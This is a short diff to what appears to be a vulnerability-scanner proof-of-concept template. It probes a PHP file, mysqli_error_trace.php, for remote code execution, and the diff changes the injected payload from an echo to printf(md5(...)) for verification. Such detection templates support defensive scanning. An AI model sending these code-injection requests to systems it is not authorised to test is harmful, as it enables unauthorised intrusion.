@@ -7,9 +7,9 @@ rules:
       expression: |
         response.status == 200
     - method: GET
-      path: "/data/mysqli_error_trace.php?_=echo \"{{r1}}\"%3B"
+      path: "/data/mysqli_error_trace.php?_=printf(md5(\"{{r1}}\"))%3B"
       expression: |
-        response.status == 200 && response.body.bcontains(bytes(r1))
+        response.status == 200 && response.body.bcontains(bytes(md5(r1)))
 detail:
     author: bufsnake(https://github.com/bufsnake)
     links:
